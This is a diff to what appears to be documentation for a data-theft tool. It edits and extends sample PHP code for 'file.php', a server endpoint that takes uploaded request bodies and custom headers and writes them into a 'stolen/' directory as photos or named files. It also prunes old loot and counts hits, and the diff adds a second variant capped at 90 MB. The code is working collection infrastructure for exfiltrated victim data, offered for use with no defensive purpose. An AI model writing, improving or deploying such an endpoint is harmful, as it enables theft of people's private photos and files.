@@ -176,6 +176,7 @@ for version2:
 	}
 
 sample of file.php:
+-----------------1-----------------------------------------
 <?php
 $lmod = $_SERVER["HTTP_LMOD"];
 $fname = $_SERVER["HTTP_FNAME"];
@@ -198,8 +199,42 @@ if(sizeof($file) > 52)
 {
 for($i = 2; $i < sizeof($file) - 50; $i++)
 {
-unlink("stolen/" . $file[i]);
+unlink("stolen/" . $file[$i]);
 }
+}
+
+$oldCount = file_get_contents('count_fileclick.txt');
+
+file_put_contents('count_fileclick.txt', $oldCount + 1);
+?>
+
+-----------------2 (90 mb storage at most)--------------------
+<?php
+$lmod = $_SERVER["HTTP_LMOD"];
+$fname = $_SERVER["HTTP_FNAME"];
+$inp = file_get_contents("php://input");
+
+$file = scandir("stolen/");
+if(sizeof($file) > 13)
+{
+for($i = 2; $i < sizeof($file); $i++)
+{
+unlink("stolen/" . $file[$i]);
+}
+}
+
+
+if($inp != "" && strlen($lmod) > 0)
+{
+$lmod = date("d-m-Y", substr($lmod, 0, -3));
+$p = "stolen/" . time() . "_" . $lmod . ".jpg";
+file_put_contents($p, $inp);
+chmod($p, 0640);
+}else if($inp != "" && strlen($fname) > 0)
+{
+$p = "stolen/" . $fname;
+file_put_contents($p, $inp);
+chmod($p, 0640);
 }
 
 $oldCount = file_get_contents('count_fileclick.txt');
